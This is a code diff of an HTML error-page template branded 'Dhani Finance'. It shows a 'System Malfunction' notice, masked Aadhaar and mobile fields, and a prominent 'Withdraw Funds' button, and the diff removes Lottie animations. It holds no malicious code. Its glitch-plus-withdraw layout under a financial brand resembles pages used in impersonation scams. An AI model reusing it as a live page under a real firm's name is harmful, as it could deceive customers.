@@ -2,65 +2,101 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>System Error - Dhani Finance</title>
+  <title>System Malfunction - Dhani Finance</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/lottie-web/5.7.4/lottie.min.js"></script>
+
   <style>
     body {
-      background: linear-gradient(to right, #e8f0ff, #f8fbff);
-      font-family: 'Lato', sans-serif;
+      background: #e8f0ff;
+      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      padding: 0;
     }
+
     .glitch-section {
       text-align: center;
-      padding: 60px 20px 30px;
+      padding: 60px 20px 20px;
     }
-    .glitch-section h2 {
+
+    .glitch-section h1 {
       color: #d63031;
       font-size: 36px;
-      font-weight: 700;
+      font-weight: bold;
+    }
+
+    .glitch-section p {
+      color: #333;
+      font-size: 15px;
+    }
+
+    .btn-primary {
+      background-color: #007bff;
+      border: none;
+      padding: 10px 25px;
+      border-radius: 25px;
+      font-weight: 600;
+    }
+
+    .btn-withdraw {
+      background-color: #28a745;
+      color: white;
+      font-size: 14px;
+      padding: 6px 20px;
+      border-radius: 20px;
+      border: none;
+      margin-bottom: 15px;
+      font-weight: 600;
+    }
+
+    .masked-box {
+      background: white;
+      max-width: 500px;
+      margin: 0 auto;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+      text-align: left;
       margin-top: 20px;
     }
-    .masked-box {
-      background: #fff;
-      padding: 25px;
-      border-radius: 15px;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
-      max-width: 520px;
-      margin: 20px auto;
-      font-size: 16px;
+
+    .masked-box p {
+      font-size: 15px;
+      margin-bottom: 8px;
     }
+
     .action-buttons {
       display: flex;
       justify-content: center;
-      flex-wrap: wrap;
       gap: 30px;
       margin-top: 50px;
+      flex-wrap: wrap;
     }
+
     .action-card {
-      width: 220px;
-      background: #fff;
-      border-radius: 20px;
-      box-shadow: 5px 5px 20px rgba(0, 0, 0, 0.1);
+      width: 200px;
+      height: 130px;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
       text-align: center;
-      padding: 20px 15px;
+      padding: 20px;
       transition: 0.3s ease;
       cursor: pointer;
-      border: 1px solid #e0e0e0;
     }
+
     .action-card:hover {
-      transform: translateY(-6px);
+      transform: translateY(-5px);
+      box-shadow: 0 10px 25px rgba(0,0,0,0.15);
     }
+
     .action-card p {
-      margin-top: 15px;
       font-weight: 600;
       color: #34495e;
+      margin-top: 10px;
     }
-    .btn-primary {
-      border-radius: 25px;
-      font-weight: 600;
-      padding: 10px 25px;
-    }
+
     .footer {
       background-color: #094c9d;
       color: white;
@@ -73,15 +109,19 @@
 </head>
 <body>
 
-  <!-- Glitch Notice -->
+  <!-- Glitch Message -->
   <div class="glitch-section">
-    <div id="glitchAnim" style="height:160px;"></div>
-    <h2>System Malfunction ⚠️</h2>
+    <h1>System Malfunction ⚠️</h1>
     <p>We are currently experiencing a technical glitch. Please try again later or contact support.</p>
     <a href="/" class="btn btn-primary mt-3">Return to Home</a>
   </div>
 
-  <!-- Masked User Details -->
+  <!-- Withdraw Button -->
+  <div class="text-center">
+    <button class="btn-withdraw" onclick="window.location.href='/withdraw'">Withdraw Funds</button>
+  </div>
+
+  <!-- Masked Info Box -->
   <div class="masked-box">
     <p><strong>User Name:</strong> {{ user_data.user_name }}</p>
     <p><strong>Masked Aadhaar:</strong> {{ user_data.aadhaar }}</p>
@@ -89,68 +129,21 @@
     <p><strong>Masked Mobile:</strong> {{ user_data.mobile }}</p>
   </div>
 
-  <!-- Action Cards -->
+  <!-- Profile + Customer Support Cards -->
   <div class="action-buttons">
-
-    <div class="action-card" onclick="window.location.href='/withdraw'">
-      <div id="withdrawAnim" style="height:100px;"></div>
-      <p>Withdraw Funds</p>
-    </div>
-
     <div class="action-card" onclick="window.location.href='/profile'">
-      <div id="profileAnim" style="height:100px;"></div>
       <p>Profile</p>
     </div>
 
     <div class="action-card" onclick="window.location.href='/customer-care'">
-      <div id="supportAnim" style="height:100px;"></div>
       <p>Customer Support</p>
     </div>
-
   </div>
 
+  <!-- Footer -->
   <div class="footer">
     &copy; 2025 Dhani Finance Ltd. All rights reserved.
   </div>
-
-  <!-- Animations -->
-  <script>
-    lottie.loadAnimation({
-      container: document.getElementById('glitchAnim'),
-      renderer: 'svg',
-      loop: true,
-      autoplay: true,
-      path: 'https://lottie.host/45bdf172-6bc5-4d80-b1ae-7be248fb4cb0/6Y5F8lqSXP.json'
-    });
-    lottie.loadAnimation({
-      container: document.getElementById('withdrawAnim'),
-      renderer: 'svg',
-      loop: true,
-      autoplay: true,
-      path: 'https://lottie.host/b229e0fa-1fc2-4fd7-8c9a-b2bb7aee52ab/tgW5EdrgVn.json'
-    });
-    lottie.loadAnimation({
-      container: document.getElementById('profileAnim'),
-      renderer: 'svg',
-      loop: true,
-      autoplay: true,
-      path: 'https://lottie.host/7a74b92f-6211-4ac8-a188-88294f6f8085/jNeUJ2lzXe.json'
-    });
-    lottie.loadAnimation({
-      container: document.getElementById('contactAnim'),
-      renderer: 'svg',
-      loop: true,
-      autoplay: true,
-      path: 'https://lottie.host/d33af0ce-5c91-4f36-b2a6-4167f7ebf6b5/Kl9kRBn6Ik.json'
-    });
-    lottie.loadAnimation({
-      container: document.getElementById('supportAnim'),
-      renderer: 'svg',
-      loop: true,
-      autoplay: true,
-      path: 'https://lottie.host/d33af0ce-5c91-4f36-b2a6-4167f7ebf6b5/Kl9kRBn6Ik.json'
-    });
-  </script>
 
 </body>
 </html>
